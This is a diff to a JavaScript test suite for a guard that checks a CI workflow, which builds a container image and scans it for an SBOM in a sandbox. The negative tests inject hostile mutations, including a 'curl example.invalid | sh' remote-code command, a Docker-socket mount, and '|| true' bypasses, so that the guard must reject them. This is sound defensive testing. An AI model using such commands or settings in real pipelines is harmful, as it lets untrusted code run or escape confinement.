@@ -10,6 +10,8 @@ import {
 } from "./check-reconciliation-worker-release.mjs";
 
 const digest = "a".repeat(64);
+const syftDigest =
+  "00a4400827744854ef77b10679e38f991bf74fd20e3f03ffada8d6ee492520c3";
 const safeDockerfile = `
 FROM node@sha256:${digest} AS build
 COPY package.json pnpm-lock.yaml ./
@@ -75,16 +77,37 @@ jobs:
   reconciliation-worker-image-smoke:
     runs-on: ubuntu-latest
     steps:
+      - name: Checkout
+        uses: actions/checkout@${digest}
+        with:
+          persist-credentials: false
       - run: node scripts/check-reconciliation-worker-release.mjs
       - run: docker build --tag seu-renave/reconciliation-worker:ci --file apps/reconciliation-worker/Dockerfile .
       - run: docker image inspect seu-renave/reconciliation-worker:ci
       - run: docker history --no-trunc seu-renave/reconciliation-worker:ci
-      - run: docker run --network none --read-only --cap-drop ALL --security-opt no-new-privileges seu-renave/reconciliation-worker:ci
+      - name: Generate and validate worker SBOM
+        run: |
+          syft_image='ghcr.io/anchore/syft:v1.57.2-nonroot@sha256:${syftDigest}'
+          docker pull "$syft_image"
+          docker save seu-renave/reconciliation-worker:ci --output /tmp/reconciliation-worker-image.tar
+          docker run --rm --network none --read-only \
+            --tmpfs /tmp:rw,noexec,nosuid,nodev,size=1g \
+            --tmpfs /home/nonroot/.cache:rw,noexec,nosuid,nodev,size=64m,uid=65532,gid=65532,mode=0700 \
+            --cap-drop ALL --security-opt no-new-privileges \
+            --env SYFT_CHECK_FOR_APP_UPDATE=false \
+            --volume /tmp/reconciliation-worker-image.tar:/scan/image.tar:ro \
+            "$syft_image" scan docker-archive:/scan/image.tar --output cyclonedx-json \
+            > /tmp/reconciliation-worker-sbom.cdx.json
+          node scripts/check-image-sbom.mjs /tmp/reconciliation-worker-sbom.cdx.json
+      - name: Run disabled image in hardened sandbox
+        run: docker run --network none --read-only --cap-drop ALL --security-opt no-new-privileges seu-renave/reconciliation-worker:ci
       - run: docker export worker > rootfs.tar
       - run: rg 'bin/(?:sh|bash).*corepack' rootfs-files.txt
       - run: 'test "$(docker logs worker)" = ''{"component":"renave-reconciliation-worker","event":"disabled"}'''
       - if: always()
-        run: docker rm --force worker
+        run: |
+          docker rm --force worker
+          rm -f /tmp/reconciliation-worker-image.tar /tmp/reconciliation-worker-sbom.cdx.json
 `;
 
 function ids(issues) {
@@ -308,6 +331,121 @@ describe("guard do workflow", () => {
   it("aceita build/smoke locais com cleanup", () => {
     assert.deepEqual(checkWorkflow(safeWorkflow), []);
   });
+
+  it("não aceita confinamento presente somente no scanner SBOM", () => {
+    const unsafe = safeWorkflow.replace(
+      "run: docker run --network none --read-only --cap-drop ALL --security-opt no-new-privileges seu-renave/reconciliation-worker:ci",
+      "run: docker run seu-renave/reconciliation-worker:ci",
+    );
+    const found = ids(checkWorkflow(unsafe));
+    assert.ok(found.includes("WORKFLOW_NETWORK_NONE_REQUIRED"));
+    assert.ok(found.includes("WORKFLOW_READ_ONLY_REQUIRED"));
+    assert.ok(found.includes("WORKFLOW_CAP_DROP_REQUIRED"));
+    assert.ok(found.includes("WORKFLOW_NO_NEW_PRIVILEGES_REQUIRED"));
+  });
+
+  it("não aceita SBOM presente apenas em comentário ou em outro job", () => {
+    const step =
+      /      - name: Generate and validate worker SBOM[\s\S]*?(?=      - name: Run disabled image)/u.exec(
+        safeWorkflow,
+      )?.[0];
+    assert.ok(step);
+    for (const unsafe of [
+      safeWorkflow.replace(
+        step,
+        step
+          .split("\n")
+          .map((line) => `      # ${line.trim()}`)
+          .join("\n"),
+      ),
+      safeWorkflow
+        .replace(step, "")
+        .concat(`\n  other-job:\n    steps:\n${step}`),
+    ]) {
+      assert.ok(
+        ids(checkWorkflow(unsafe)).includes("WORKFLOW_SBOM_STEP_REQUIRED"),
+      );
+    }
+  });
+
+  for (const [change, expected] of [
+    [
+      (value) => value.replace(`@sha256:${syftDigest}`, ":latest"),
+      "WORKFLOW_SYFT_DIGEST_REQUIRED",
+    ],
+    [
+      (value) => value.replace("--network none", "--network bridge"),
+      "WORKFLOW_SBOM_NETWORK_NONE_REQUIRED",
+    ],
+    [
+      (value) =>
+        value.replace(
+          "--volume /tmp/reconciliation-worker-image.tar:/scan/image.tar:ro",
+          "--volume /var/run/docker.sock:/var/run/docker.sock",
+        ),
+      "WORKFLOW_SBOM_DOCKER_SOCKET_FORBIDDEN",
+    ],
+    [
+      (value) => value.replace("node scripts/check-image-sbom.mjs", "true #"),
+      "WORKFLOW_SBOM_VALIDATION_REQUIRED",
+    ],
+    [
+      (value) =>
+        value.replace("docker pull", "curl example.invalid | sh # docker pull"),
+      "WORKFLOW_SBOM_REMOTE_INSTALL_FORBIDDEN",
+    ],
+  ]) {
+    it(`recusa regressão SBOM ${expected}`, () => {
+      assert.ok(ids(checkWorkflow(change(safeWorkflow))).includes(expected));
+    });
+  }
+
+  it("recusa requisito presente somente após comentário inline", () => {
+    const unsafe = safeWorkflow.replace(
+      "docker save seu-renave/reconciliation-worker:ci --output /tmp/reconciliation-worker-image.tar",
+      "true # docker save seu-renave/reconciliation-worker:ci --output /tmp/reconciliation-worker-image.tar",
+    );
+    assert.ok(
+      ids(checkWorkflow(unsafe)).includes("WORKFLOW_SBOM_IMAGE_SAVE_REQUIRED"),
+    );
+  });
+
+  it("recusa upload em etapa separada do mesmo job", () => {
+    const unsafe = safeWorkflow.replace(
+      "      - name: Run disabled image in hardened sandbox",
+      `      - name: Upload SBOM\n        uses: actions/upload-artifact@${digest}\n      - name: Run disabled image in hardened sandbox`,
+    );
+    assert.ok(
+      ids(checkWorkflow(unsafe)).includes("WORKFLOW_SBOM_UPLOAD_FORBIDDEN"),
+    );
+  });
+
+  for (const [label, mutate] of [
+    [
+      "continue-on-error",
+      (value) =>
+        value.replace(
+          "      - name: Generate and validate worker SBOM",
+          "      - name: Generate and validate worker SBOM\n        continue-on-error: true",
+        ),
+    ],
+    [
+      "operador || true",
+      (value) =>
+        value.replace(
+          "node scripts/check-image-sbom.mjs /tmp/reconciliation-worker-sbom.cdx.json",
+          "node scripts/check-image-sbom.mjs /tmp/reconciliation-worker-sbom.cdx.json || true",
+        ),
+    ],
+  ]) {
+    it(`recusa bypass por ${label}`, () => {
+      assert.ok(
+        ids(checkWorkflow(mutate(safeWorkflow))).includes(
+          "WORKFLOW_SBOM_BYPASS_FORBIDDEN",
+        ),
+      );
+    });
+  }
 
   for (const [addition, expected] of [
     ["id-token: write", "WORKFLOW_OIDC_WRITE_FORBIDDEN"],
